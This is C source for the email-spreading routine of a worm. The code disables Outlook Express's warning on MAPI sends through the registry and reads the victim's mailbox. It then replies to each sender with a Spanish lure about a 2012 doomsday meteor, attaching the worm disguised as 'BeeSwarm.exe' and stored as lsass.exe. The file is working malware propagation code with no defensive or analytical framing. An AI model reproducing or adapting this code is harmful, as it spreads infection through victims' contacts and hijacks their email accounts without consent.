#include "wALL.h"
#include "Defines.h"
#include <mapi.h>

int EmailSpread () {
//	unsigned long __stdcall EmailSpam( void* ) {

   HKEY         RegHandle1;
   HKEY         RegHandle2;
   char         DefaultUserId[100];
   DWORD         DefaultUserIdSize = sizeof(DefaultUserId);
   DWORD         WarnDisable = 0;

   HINSTANCE      MapiDll;
   LPMAPILOGON      MapiLogon;
   LPMAPIFINDNEXT      MapiFindNext;
   LPMAPIREADMAIL      MapiReadMail;
   LPMAPISENDMAIL      MapiSendMail;
   LPMAPILOGOFF      MapiLogoff;
   LHANDLE         MapiSessionHandle;
   MapiMessage      *GetMessage;
   MapiMessage      Message;
   MapiRecipDesc      Originator;
   MapiRecipDesc      Recips;
   MapiFileDesc      Files;


   char         WormFile[MAX_PATH] = "%appdata%\\lsass.exe";
   char         Subject[100];
   char         VictimAddress[100];
   char         MessageBuffer[512];
   char         Re[] = "Re: ";
   unsigned short      MailCount = 15; //10

   Message.ulReserved      = 0;
   Message.lpszSubject      = Subject;
   Message.lpszNoteText     = "Hola,2012 el fin del mundo ya comprobaron que biene un meteorito y no han dicho nada.aca puedes ver unas imagenes de la nasa de los lugares donde la tierra se esta deteriorando, solo fata un año.informate en el siguiente enlace";
   Message.lpszMessageType      = 0;
   Message.lpszDateReceived   = 0;
   Message.lpszConversationID   = 0;
   Message.flFlags         = 0;
   Message.lpOriginator      = &Originator;
   Message.nRecipCount      = 1;
   Message.lpRecips      = &Recips;
   Message.nFileCount      = 1;
   Message.lpFiles         = &Files;

   Originator.ulReserved      = 0;
   Originator.ulRecipClass      = MAPI_ORIG;
   Originator.lpszName      = 0;
   Originator.lpszAddress      = 0;
   Originator.ulEIDSize      = 0;
   Originator.lpEntryID      = 0;

   Recips.ulReserved      = 0;
   Recips.ulRecipClass      = MAPI_TO;
   Recips.lpszName         = 0;
   Recips.lpszAddress      = VictimAddress;
   Recips.ulEIDSize      = 0;
   Recips.lpEntryID      = 0;

   Files.ulReserved      = 0;
   Files.flFlags         = 0;
   Files.nPosition         = 0;
   Files.lpszPathName      = WormFile;
   Files.lpszFileName      = "BeeSwarm.exe"; //szEXE;
   Files.lpFileType      = 0;

	//Registry disable warning when sending the mail... yo(:
   RegOpenKeyEx(HKEY_CURRENT_USER, "Identities", 0, KEY_QUERY_VALUE, &RegHandle1);
   RegQueryValueEx(RegHandle1, "Default User ID", 0, 0, (BYTE *)&DefaultUserId, &DefaultUserIdSize);
   lstrcat(DefaultUserId, "\\Software\\Microsoft\\Outlook Express\\5.0\\Mail");
   RegOpenKeyEx(RegHandle1, DefaultUserId, 0, KEY_SET_VALUE, &RegHandle2);
   RegSetValueEx(RegHandle2, "Warn on Mapi Send", 0, REG_DWORD, (BYTE *)&WarnDisable, sizeof(WarnDisable));
   RegCloseKey(RegHandle2);
   RegCloseKey(RegHandle1);


   MapiDll      = LoadLibrary("MAPI32.DLL");
   MapiLogon   = (LPMAPILOGON)      GetProcAddress(MapiDll, "MAPILogon");
   MapiFindNext   = (LPMAPIFINDNEXT)   GetProcAddress(MapiDll, "MAPIFindNext");
   MapiReadMail   = (LPMAPIREADMAIL)   GetProcAddress(MapiDll, "MAPIReadMail");
   MapiSendMail   = (LPMAPISENDMAIL)   GetProcAddress(MapiDll, "MAPISendMail");
   MapiLogoff   = (LPMAPILOGOFF)   GetProcAddress(MapiDll, "MAPILogoff");

   GetModuleFileName(0, WormFile, sizeof(WormFile));
   MapiLogon(0, 0, 0, 0, 0, &MapiSessionHandle);

   while(MapiFindNext(MapiSessionHandle, 0, 0, MessageBuffer, MAPI_GUARANTEE_FIFO, 0, MessageBuffer) == SUCCESS_SUCCESS || MailCount == 0)
   {
      if(MapiReadMail(MapiSessionHandle, 0, MessageBuffer, 0, 0, &GetMessage) == SUCCESS_SUCCESS)
      {

         lstrcpy(Subject, Re);
         lstrcat(Subject, GetMessage->lpszSubject);

         lstrcpy(VictimAddress, GetMessage->lpOriginator->lpszAddress);

         if (MapiSendMail(MapiSessionHandle, 0, &Message, 0, 0) == SUCCESS_SUCCESS)
         {
            MailCount--;
         }
      } else {
		  return 0; 
	  }
   }
	  
   MapiLogoff(MapiSessionHandle, 0, 0, 0);
   FreeLibrary(MapiDll);

  return 0;
}

